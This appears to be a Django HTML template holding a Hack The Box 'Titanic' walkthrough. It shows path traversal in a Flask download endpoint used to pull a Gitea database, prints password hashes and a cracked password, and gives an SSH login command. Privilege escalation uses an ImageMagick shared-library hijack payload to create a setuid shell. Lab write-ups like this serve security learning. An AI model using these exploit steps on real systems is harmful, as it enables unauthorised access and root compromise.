@@ -1,0 +1,142 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Titanic</h1>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>sudo nmap -p- -sCV IP --min-rate=2900 > nmap.txt</code></pre></div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/titanic/1-nmap.png' %}" alt="">
+        <p class="text">HTTP and SSH are opened. As usual, let's browse website target hosting.</p>
+    </div>
+
+    <div class="code-box"><pre><code>echo 'Target_IP titanic.htb' | sudo tee -a /etc/hosts</code></pre></div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/titanic/2-page.png' %}" alt="">
+        <p class="text">This page provides booking function. It seems to be vulnerable to SSRF or something. So, let's find some vulnerabilities while fuzzing subdomain and directories.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/titanic/3-ffuf.png' %}" alt="">
+        <p class="text">As soon as I started fuzzing, ffuf returns subdomain 'dev', where seems to be a development application. Before configuring what type vulnerabilities this webpage holds, we should see subdomain.</p>
+    </div>
+
+    <div class="code-box"><pre><code>echo 'Target_IP dev.titanic.htb' | sudo tee -a /etc/hosts</code></pre></div>
+
+    <h2 class="subtitle">Foothold</h2>
+    <p class="text">This page holds background code <u>app.py</u>, and we can see there is vulnerability. </p>
+    <div class="img">
+        <img src="{% static 'EthHack/images/titanic/3-5-dev.png' %}" alt="">
+        <img src="{% static 'EthHack/images/titanic/4-py-code.png' %}" alt="">
+    </div>
+
+    <p class="text">In the app.py, we can see there is no sanitization and modification for ticket variable. Also, the python code os.path.join() can load all <br>
+         file from machine. Therefore, we can request /etc/passwd, whatever.</p>
+    <div class="code-box"><pre><code>@app.route('/download', methods=['GET'])
+def download_ticket():
+    ticket = request.args.get('ticket')
+    if not ticket:
+        return jsonify({"error": "Ticket parameter is required"}), 400
+
+    json_filepath = os.path.join(TICKETS_DIR, ticket)
+
+    if <u>os.path.exists(json_filepath):</u>
+        return send_file(json_filepath, as_attachment=True, download_name=ticket)
+    else:
+        return jsonify({"error": "Ticket not found"}), 404
+</code></pre></div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/titanic/5-SSRF.png' %}" alt="">
+        <p class="text">This <a href="https://docs.gitea.com/administration/customizing-gitea">instruction page</a> tells us where important files are located. So, we can extract those files via the vulnerability we found before. <br><br>
+        <u>download?ticket=/home/developer/gitea/data/gitea/gitea.db</u></p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/titanic/6-download.png' %}" alt="">
+        <p class="text">Then, let's download the database with <u>curl</u> command, and check if there is hashed password.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/titanic/7-hash.png' %}" alt="">
+        <p class="text">Open this database with sqlite, and <u>.table</u> -> <u>select * from user</u>, we can find hashed password. The users we know are "root" and "developer". As the root password tend to be strong, let's crack the hash of developer.</p>
+    </div>
+
+    <div class="code-box"><pre><code>id|lower_name|name|full_name|email|keep_email_private|email_notifications_preference|passwd|passwd_hash_algo|must_change_password|login_type|login_source|login_name|type|location|website|rands|salt|language|description|created_unix|updated_unix|last_login_unix|last_repo_visibility|max_repo_creation|is_active|is_admin|is_restricted|allow_git_hook|allow_import_local|allow_create_organization|prohibit_login|avatar|avatar_email|use_custom_avatar|num_followers|num_following|num_stars|num_repos|num_teams|num_members|visibility|repo_admin_change_team_access|diff_view_style|theme|keep_activity_private
+1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
+2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|<u>pbkdf2$50000$50</u>|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0</code></pre></div>
+
+        <p class="text">And the valid format for hashcat is...</p>
+        <div class="code-box"><pre><code>username:sha256:iterations:base64_salt:base64_hash</code></pre></div>
+        <p class="text">After creating hash.txt, use hashcat.</p>
+    <div class="code-box"><pre><code>hashcat hash.txt /usr/share/wordlists/rockyou.txt --user</code></pre></div>
+    <p class="text">Then we got password "<u>25282528</u>".</p>
+    <p class="text">We can access to target machine with</p>
+    <div class="code-box"><pre><code>sshpass -p '25282528' ssh developer@titanic.htb</code></pre></div>
+
+    <p class="text"><strong>IF</strong> you don't know how to format the hashed password, visit <a href="{% url 'hashcat' %}">HERE.</a></p>
+
+    <h2 class="subtitle">Privilege Escalation</h2>
+    <div class="code-box"><pre><code>|_$ ls -la
+total 20
+drwxr-xr-x 5 root root 4096 Feb 7 10:37 .
+drwxr-xr-x 19 root root 4096 Feb 7 10:37 ..
+drwxr-xr-x 5 root developer 4096 Feb 7 10:37 app
+drwx--x--x 4 root root 4096 Feb 7 10:37 containerd
+drwxr-xr-x 2 root root 4096 Feb 7 10:37 scripts
+|_$ find /opt/app -type d -perm 770
+./static/assets/images
+./tickets</code></pre></div>
+    <p class="text">There is interesting directory 'scripts' and there are two directory user developer have privilege. At first, let's observe what's in the scripts dir.</p>
+    <div class="code-box"><pre><code>|_$ cd scripts
+|_$ cat identify_images.sh
+cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify
+>> metadata.log</code></pre></div>
+    <p class="text">This file empty contents of metadata.log, and find all jpg files in this folder and then passing those to the magick command. The output is returned to metadata.log again.</p>
+    <img src="{% static 'EthHack/images/titanic/8-ls.png' %}" alt="" id="big">
+    <p class="text">As you can see, the file <u>metadata.log</u> is updated every minutes. Therefore, we can say the file identify_images.sh is cronjob. Let's check if we can exploit this file.</p>
+    <div class="code-box"><pre><code>developer@titanic:/opt/scripts$ cat identify_images.sh
+cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log</code></pre></div>
+    <p class="text">Since there is no flaw in the script, we should check the version of the command /usr/bin/magick, and search if there is CVE. </p>
+    <div class="code-box"><pre><code>|_$ magick --version
+Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
+Copyright: (C) 1999 ImageMagick Studio LLC
+License: https://imagemagick.org/script/license.php
+Features: Cipher DPC HDRI OpenMP(4.5) 
+Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
+Compiler: gcc (9.4)
+</code></pre></div>
+
+    <p class="text">Searching keyword "ImageMagick 7.1.1.1-35 exploit", there is interesting <a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">PoC</a>. ImageMagick seems to be exploited with the code</p>
+    <div class="code-box"><pre><code>gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("<u>ARBITRARY_CODE</u>");
+    exit(0);
+}
+EOF</code></pre></div>
+    <p class="text">Since we do not have privilege to run the cronjob, we need to wait for a minute.</p>
+    <p class="text">We can input any code in "<u>ARBITRARY_CODE</u>". For instance,</p>
+    <div class="code-box"><pre><code>cp /bin/sh /tmp && chmod u+s /tmp/sh</code></pre></div>
+    <p class="text">We can use newly created file in /tmp and establish root bash.</p>
+
+    <h2 class="subtitle">PoC</h2>
+    <p class="text">If you interested in the mechanism of ImageMagick 7.1.1.1-35 exploit, please visit <a href="{% url 'imagemagick' %}">HERE</a></p>
+</body>
+</html>
